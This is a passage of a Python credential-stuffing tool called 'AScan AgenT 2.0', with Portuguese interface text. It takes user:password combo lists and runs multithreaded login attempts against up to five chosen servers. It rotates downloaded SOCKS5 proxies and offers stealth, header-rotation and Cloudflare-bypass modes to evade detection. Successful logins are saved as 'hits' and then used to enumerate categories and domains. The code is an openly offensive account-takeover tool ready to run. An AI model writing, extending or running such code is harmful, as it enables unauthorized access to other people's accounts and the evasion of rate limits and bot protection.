                        tela += f"  {C['ciano']}|{R} {dom}\n"

        tela += f"""
{B}{'='*55}
{L} Comandos:{R}
  {C['vermelho']}F{R} - Finalizar  {C['vermelho']}V{R} - Stop Dominios
  {C['vermelho']}1-5{R} - Stop Servidor  {C['amarelo']}P{R} - Pausar  {C['verde']}E{R} - Continuar
  {C['roxo']}M{R} - Menu de Ataque  {C['azul_claro']}X{R} - Trocar Proxy
{cor_spin}{'='*55}{R}
"""

        with _display_lock:
            sys.stdout.write('\033[2J\033[H')
            sys.stdout.write(tela)
            sys.stdout.flush()
    except Exception as e:
        pass

# ========== MENU DE ATAQUE ==========
def menu_ataque():
    global MODO_ATAQUE, MODO_ATAQUE_PARAMS

    print(f"\n{C['roxo']}======= MENU DE ATAQUE ======={C['reset']}")
    print(f"\n{C['ciano']}Modo Atual:{C['reset']} {C['amarelo']}{MODO_ATAQUE.replace('_', ' ').title()}{C['reset']}")
    print(f"\n{C['verde']}[1] Padrao - Velocidade maxima{C['reset']}")
    print(f"{C['verde']}[2] Adaptativo - Ajusta automaticamente{C['reset']}")
    print(f"{C['amarelo']}[3] Furtivo - Rajadas com pausas{C['reset']}")
    print(f"{C['azul']}[4] Camaleao - Headers dinamicos{C['reset']}")
    print(f"{C['magenta']}[5] Bypass Intenso - Cloudscraper{C['reset']}")
    print(f"{C['vermelho']}[0] Voltar{C['reset']}")

    try:
        choice = int(input(f"\n{C['ciano']}Escolha: {C['reset']}"))
        modos = {
            1: 'padrao',
            2: 'adaptativo',
            3: 'furtivo',
            4: 'camaleao',
            5: 'bypass_intenso',
        }
        if choice in modos:
            MODO_ATAQUE = modos[choice]
            print(f"\n{C['verde']} Modo alterado para: {MODO_ATAQUE.replace('_', ' ').title()}{C['reset']}")
        elif choice == 0:
            return
        else:
            print(f"\n{C['vermelho']}Opcao invalida!{C['reset']}")
    except:
        print(f"\n{C['vermelho']}Digite um numero!{C['reset']}")

    time.sleep(1.5)

# ========== WORKER ==========
def worker(server, task_q, stats, server_hits, combo_name, total_checks, scan_id, proxies_list=None):
    proxy = random.choice(proxies_list) if proxies_list else None
    consecutive_fails = 0
    stealth_burst_counter = 0

    while not _stop_early.is_set():
        if _pause_scan.is_set():
            time.sleep(0.2)
            continue

        try:
            item = task_q.get(timeout=0.5)
        except queue.Empty:
            break

        if _is_scan_stopped_for_server(server):
            task_q.task_done()
            continue

        user, pwd = item

        try:
            if MODO_ATAQUE == 'furtivo':
                stealth_burst_counter += 1
                if stealth_burst_counter > random.randint(3, 8):
                    time.sleep(random.uniform(1, 4))
                    stealth_burst_counter = 0

            if MODO_ATAQUE == 'camaleao':
                renew_session_hibrida(server, proxy)

            use_cloudscraper = (MODO_ATAQUE == 'bypass_intenso' and CLOUDSCRAPER_AVAILABLE)

            ok, data = check_target(server, item, proxy=proxy)

            with _display_lock:
                stats['checks'] += 1
                elapsed = time.time() - stats['start']
                stats['cpm'] = stats['checks'] / elapsed * 60 if elapsed > 0 else 0

            if ok:
                consecutive_fails = 0
                server_hits[server] = server_hits.get(server, 0) + 1
                stats['hits'] += 1

                hit_alarm()

                save_combo_for_server(server, user, pwd)

                texto, is_ilimitado = build_hit_text(server, item, data)
                save_hit(server, texto, is_ilimitado)

                with _RESULTS_LOCK:
                    host = server.split(':')[0]
                    HIT_CASCADE.append(f"http://{host[:20]} | {user[:8]} - {pwd[:8]}")

                if server not in BASELINE_CATS or not BASELINE_CATS[server]:
                    cats = get_categories(server, user, pwd, timeout=8)
                    BASELINE_CATS[server] = _cats_to_set(cats)

                if BASELINE_CATS.get(server):
                    port = server.split(':')[1] if ':' in server else '80'
                    run_parallel_domains(server, user, pwd, port)

            else:
                consecutive_fails += 1
                if consecutive_fails >= 3 and proxies_list:
                    proxy = random.choice(proxies_list)
                    consecutive_fails = 0
                elif consecutive_fails >= 5 and MODO_ATAQUE == 'adaptativo':
                    renew_session_hibrida(server, proxy)
                    consecutive_fails = 0

            if stats['checks'] % 3 == 0:
                try:
                    render_panel(combo_name, stats, total_checks, server_hits)
                except:
                    pass

        except:
            pass
        finally:
            task_q.task_done()

def _is_scan_stopped_for_server(server):
    idx = SERVER_INDEX.get(server, 0)
    ev = _stop_combos_by_index.get(idx)
    return ev is not None and ev.is_set()

# ========== KEYBOARD LISTENER ==========
def keyboard_listener():
    import termios, tty, select
    if not sys.stdin.isatty():
        return

    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    try:
        tty.setcbreak(fd)
        while not _stop_early.is_set():
            r, _, _ = select.select([sys.stdin], [], [], 0.1)
            if r:
                ch = sys.stdin.read(1)
                if not ch:
                    continue

                if ch.lower() == 'f':
                    _stop_early.set()
                    _stop_parallel.set()
                    for ev in _stop_combos_by_index.values():
                        ev.set()
                    break

                elif ch.lower() == 'v':
                    _stop_parallel.set()
                    for st in PARALLEL_SCANS.values():
                        st.finished.set()

                elif ch in '12345':
                    idx = int(ch)
                    ev = _stop_combos_by_index.get(idx)
                    if ev:
                        ev.set()
                        _stop_after_parallel.set()

                elif ch.lower() == 'p':
                    _pause_scan.set()

                elif ch.lower() == 'e':
                    _pause_scan.clear()

                elif ch.lower() == 'm':
                    menu_ataque()

                elif ch.lower() == 'x':
                    print(f"\n{C['azul']} Recarregando proxies...{C['reset']}")
                    proxy_path, _ = choose_proxy_file()
                    if proxy_path:
                        proxies_list = load_proxies(proxy_path)
                        print(f"{C['verde']} {len(proxies_list)} proxies carregados!{C['reset']}")
                    time.sleep(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)

def start_keyboard_listener():
    threading.Thread(target=keyboard_listener, daemon=True).start()

# ========== MENU PRINCIPAL ==========
def ask_servers():
    os.system('clear')
    B = TEMPLATE_CORES['borda']
    T = TEMPLATE_CORES['titulo']
    L = TEMPLATE_CORES['label']
    R = C['reset']

    print(f"{B}{'='*55}")
    print(f"{T}     AScan AgenT 2.0  AScan   {B} ")
    print(f"{B}{'='*55}{R}")
    print(f"{L}Digite ate 5 servidores para escanear:{R}\n")

    servers = []
    for i in range(1, 6):
        try:
            s = input(f"{C['ciano']}Servidor {i} > {C['amarelo']}").strip()
            print(C['reset'], end='')
            if s:
                s = s.replace('http://', '').replace('https://', '').strip()
                if ':' not in s:
                    s += ':80'
                servers.append(s)
        except:
            break

    return servers

def choose_combo():
    try:
        files = [f for f in os.listdir(COMBO_DIR) if f.endswith('.txt') and os.path.isfile(os.path.join(COMBO_DIR, f))]
        if not files:
            print(f"{C['vermelho']}Nenhum arquivo combo encontrado!{C['reset']}")
            sys.exit(1)

        print(f"\n{C['azul']} Arquivos combo disponiveis:{C['reset']}")
        for i, f in enumerate(files, 1):
            print(f"{C['amarelo']}{i}> {f}{C['reset']}")

        while True:
            try:
                choice = int(input(f"\n{C['ciano']}Escolha: {C['reset']}"))
                if 1 <= choice <= len(files):
                    return os.path.join(COMBO_DIR, files[choice-1]), files[choice-1]
            except ValueError:
                print(f"{C['vermelho']}Digite um numero!{C['reset']}")
    except:
        sys.exit(1)

def load_items(combo_path):
    items = []
    try:
        with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and ':' in line:
                    u, p = line.split(':', 1)
                    u = u.strip()
                    p = p.strip()
                    if u and p:
                        items.append((u, p))
    except Exception as e:
        print(f"{C['vermelho']}Erro ao ler combo: {e}{C['reset']}")
    return items

# ========== CONFIGURAR PROXY ==========
def configurar_proxy():
    print(f"\n{C['azul']} Configurar Proxy:{C['reset']}")
    print(f"{C['amarelo']}[1] Sem proxy (direto){C['reset']}")
    print(f"{C['amarelo']}[2] Baixar proxies da internet{C['reset']}")
    print(f"{C['amarelo']}[3] Carregar de arquivo local{C['reset']}")

    try:
        choice = int(input(f"\n{C['ciano']}Escolha: {C['reset']}"))

        if choice == 1:
            return []
        elif choice == 2:
            print(f"\n{C['azul']} Baixando proxies SOCKS5...{C['reset']}")
            proxies = download_proxies_online('socks5')
            if proxies:
                print(f"{C['verde']} {len(proxies)} proxies baixados!{C['reset']}")
                return proxies
            else:
                print(f"{C['vermelho']} Falha ao baixar proxies{C['reset']}")
                return []
        elif choice == 3:
            proxy_path, _ = choose_proxy_file()
            if proxy_path:
                proxies = load_proxies(proxy_path)
                print(f"{C['verde']} {len(proxies)} proxies carregados!{C['reset']}")
                return proxies
            return []
        else:
            return []
    except:
        return []

# ========== MAIN ==========
def main():
    global COMBO_ATUAL_NOME, _start_time, STATS_GERAIS, MODO_ATAQUE

    os.system('clear')

    B = TEMPLATE_CORES['borda']
    T = TEMPLATE_CORES['titulo']
    L = TEMPLATE_CORES['label']
    R = C['reset']

    print(f"{B}{'='*55}")
    print(f"{T}     AScan AgenT 2.0  AScan   {B} ")
    print(f"{B}{'='*55}")
    print(f"{L} Motor hibrido: AScan Bypass Engine{C['reset']}")
    print(f"{B}{'='*55}{R}")
    time.sleep(1)

    servers = ask_servers()
    if not servers:
        print(f"{C['vermelho']}Nenhum servidor especificado!{C['reset']}")
        return

    global _stop_combos_by_index, SERVER_INDEX
    _stop_combos_by_index = {i: threading.Event() for i in range(1, 6)}
    for i, s in enumerate(servers, start=1):
        SERVER_INDEX[s] = i

    print(f"\n{C['azul']} Resumo dos servidores:{C['reset']}\n")
    for s in servers:
        host = s.split(':')[0]
        port = s.split(':')[1] if ':' in s else '80'
        ip = resolve_ip(host)
        geo = geo_lookup(ip) if ip else {}
        geo_txt = describe_geo(geo)
        print(f"  {C['amarelo']}http://{host}:{port}{C['reset']}")
        print(f"    > IP: {C['verde']}{ip or 'N/A'}{C['reset']}")
        print(f"    > Local: {C['ciano']}{geo_txt}{C['reset']}\n")

    combo_path, COMBO_ATUAL_NOME = choose_combo()

    proxies_list = configurar_proxy()

    print(f"\n{C['roxo']} Modo de Ataque:{C['reset']}")
    print(f"{C['verde']}[1] Padrao (rapido){C['reset']}")
    print(f"{C['verde']}[2] Adaptativo (recomendado){C['reset']}")
    print(f"{C['amarelo']}[3] Furtivo (evasao){C['reset']}")
    print(f"{C['azul']}[4] Camaleao (headers dinamicos){C['reset']}")
    print(f"{C['magenta']}[5] Bypass Intenso (cloudscraper){C['reset']}")

    try:
        choice = int(input(f"\n{C['ciano']}Escolha (Enter=2): {C['reset']}") or "2")
        modos = {1: 'padrao', 2: 'adaptativo', 3: 'furtivo', 4: 'camaleao', 5: 'bypass_intenso'}
        MODO_ATAQUE = modos.get(choice, 'adaptativo')
        print(f"{C['verde']} Modo: {MODO_ATAQUE.replace('_', ' ').title()}{C['reset']}")
    except:
        MODO_ATAQUE = 'adaptativo'
        print(f"{C['verde']} Modo: Adaptativo (padrao){C['reset']}")

    try:
        n_threads = int(input(f"\n{C['ciano']}Threads por servidor (Enter=20): {C['reset']}") or "20")
        n_threads = max(1, min(n_threads, 50))
    except:
        n_threads = 20

    items = load_items(combo_path)
    if not items:
        print(f"{C['vermelho']}Combo vazio!{C['reset']}")
        return

    total_checks = len(items) * len(servers)
    stats = {'hits': 0, 'checks': 0, 'cpm': 0.0, 'start': time.time()}
    server_hits = {s: 0 for s in servers}
    _start_time = time.time()
    STATS_GERAIS = {"hits": 0, "hits_ilimitados": 0, "checks": 0, "start_time": _start_time}

    for s in servers:
        t = threading.Thread(target=background_status_refresher, args=(s, 10), daemon=True)
        t.start()

    task_queues = {}
    for s in servers:
        q = queue.Queue()
        for item in items:
            q.put(item)
        task_queues[s] = q

    start_keyboard_listener()

    workers = []
    for s in servers:
        scan_id = SERVER_INDEX.get(s, 1)
        for _ in range(n_threads):
            t = threading.Thread(
                target=worker,
                args=(s, task_queues[s], stats, server_hits, COMBO_ATUAL_NOME, total_checks, scan_id, proxies_list),
                daemon=True
            )
            t.start()
            workers.append(t)

    print(f"\n{C['verde']} Scan iniciado!{C['reset']}")
    print(f"{C['cinza']}Comandos: F=Stop | V=Stop Dominios | 1-5=Stop Servidor | P=Pause | E=Continuar | M=Menu Ataque | X=Trocar Proxy{C['reset']}\n")

    try:
        while any(t.is_alive() for t in workers):
            if _stop_early.is_set():
                break
            render_panel(COMBO_ATUAL_NOME, stats, total_checks, server_hits)
            time.sleep(0.8)
    except KeyboardInterrupt:
        _stop_early.set()

    time.sleep(0.5)
    os.system('clear')

    print(f"{B}{'='*55}")
    print(f"{T}     [ SCAN FINALIZADO ]     {B} ")
    print(f"{B}{'='*55}")
    print(f"{L}Servidores:{R} {len(servers)}")
    print(f"{L}Total Checks:{R} {stats['checks']:,}")
    print(f"{L}Total Hits:{R} {D}{stats['hits']}{R}")
    print(f"{L}Ilimitados:{R} {C['amarelo']}{STATS_GERAIS['hits_ilimitados']}{R}")
    print(f"{L}Modo de Ataque:{R} {C['roxo']}{MODO_ATAQUE.replace('_', ' ').title()}{R}")
    print(f"{L}Arquivos salvos em:{R} {HITS_DIR}")
    print(f"{B}{'='*55}{R}")

    try:
        arquivos = [f for f in os.listdir(HITS_DIR) if f.endswith('.txt')]
        if arquivos:
            print(f"\n{L} Ultimos arquivos salvos:{R}")
            for arq in arquivos[-10:]:
                print(f"  {C['verde']}> {arq}{R}")
    except:
        pass

    input(f"\n{L}ENTER para sair...{R}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C['vermelho']} Interrompido{C['reset']}")
        sys.exit()
